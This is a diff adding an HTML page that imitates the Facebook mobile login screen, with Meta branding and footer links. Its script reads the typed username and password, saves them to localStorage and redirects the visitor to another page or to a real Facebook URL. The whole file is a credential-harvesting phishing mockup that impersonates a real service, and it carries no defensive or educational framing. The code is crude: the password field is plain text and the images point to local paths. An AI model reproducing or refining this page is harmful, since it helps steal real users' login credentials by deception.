@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>m.facebook.com/login</title>
+    <style>
+        @media only screen and (max-width: 400px){
+            body{
+                width: 90%;
+                height: 90%;
+            }  
+        }
+          @media only screen and (max-width: 800px){
+            body{
+                width: 90%;
+                height: 90%;
+            }
+        }
+            </style>
+</head>
+<body style="background-color: rgb(249, 255, 255)">
+    <center>
+        <label style="font-family: Arial, Helvetica, sans-serif;">English (UK)</label><br><br><br>
+    <img src="C:\Users\DAMIAN'S GUEST\Downloads\sfdtbzgh.png" alt="" style="width: 50px;"><br><br><br><br>
+    <input type="text" name="" style="width:300px;height: 50px;border-radius: 15px;background:white;border-color:whitesmoke;font-size: 20px;" id="username" placeholder="Mobile number or email address"><br><br>
+    <input type="text" name="" style="width:300px;height: 50px;border-radius: 15px;background:white;border-color:whitesmoke;font-size: 20px;" id="password" placeholder="Password"><br><br>
+    <form>
+    <button id="login" style="background:blue;border-radius: 15px;color: white;width: 300px;height:35px;border: 0;font-size: 15px;">Log in</button><br><br>    
+    <button formaction="https://m.facebook.com/login/identify/" style="background:white;border: 0;font-size: 15px;">Forgotten Password</button><br><br><br><br>
+    <button formaction="https://m.facebook.com/reg/" style="background:white;border-color:blue;color: blue;font-size: 15px;width: 300px;height:35px;border-radius: 15px;border-width: 1px;">Create new account</button><br>
+    <img src="C:\Users\DAMIAN'S GUEST\Downloads\meta.jpg" alt=""><br>
+    <label for="about">About</label>&nbsp;&nbsp;<button formaction="https://web.facebook.com/help/?ref=pf&_rdc=1&_rdr" style="background:white;border: 0;font-size: 15px;">Help</button>&nbsp;&nbsp;<button id="more" style="background:white;border: 0;font-size: 15px;">More</button>
+</form>
+<form id="form" style="display: none;">
+    Messenge&nbsp;&nbsp;&nbsp;&nbsp;Facebook Lite&nbsp;&nbsp;&nbsp;&nbsp;Video&nbsp;&nbsp;&nbsp;&nbsp;Places&nbsp;&nbsp;&nbsp;&nbsp;Games&nbsp;&nbsp;&nbsp;&nbsp;Marketplace <br>
+    Meta Pay&nbsp;&nbsp;&nbsp;&nbsp;Meta Stor&nbsp;&nbsp;&nbsp;&nbsp;Meta Ques&nbsp;&nbsp;&nbsp;&nbsp;Meta Ai&nbsp;&nbsp;&nbsp;&nbsp;Instagram&nbsp;&nbsp;&nbsp;&nbsp;Threads <br>
+    Fundraisers&nbsp;&nbsp;&nbsp;&nbsp;Services&nbsp;&nbsp;&nbsp;&nbsp;Developers&nbsp;&nbsp;&nbsp;&nbsp;Careers&nbsp;&nbsp;&nbsp;&nbsp;Privacy Policy <br>
+    Privacy Centre&nbsp;&nbsp;&nbsp;&nbsp;Groups
+</form>
+</center>
+<script>
+    const Username = document.getElementById('username');
+    const Password = document.getElementById('password');
+    const Login = document.getElementById('login');
+    const More = document.getElementById('more');
+
+Login.addEventListener('click', (e) =>{
+    e.preventDefault();
+    const UsernameValue = Username.value;
+    const PasswordValue = Password.value;
+    
+    localStorage.setItem('Username', UsernameValue)
+    localStorage.setItem('Password', PasswordValue)
+    window.location.href = 'Marvel.html'
+
+    if(Username.value !="" & Password.value != ""){
+        window.location.href = "https://m.facebook.com/messages/blocked/"
+    }
+    else{
+        window.alert('Email address or mobile number required')
+        window.location.href = "facebook.html"
+    }
+})
+
+    More.onclick = function(e){
+        e.preventDefault();
+        document.getElementById('form').style.display = "block";
+    }
+   
+</script>
+</body>
+</html>
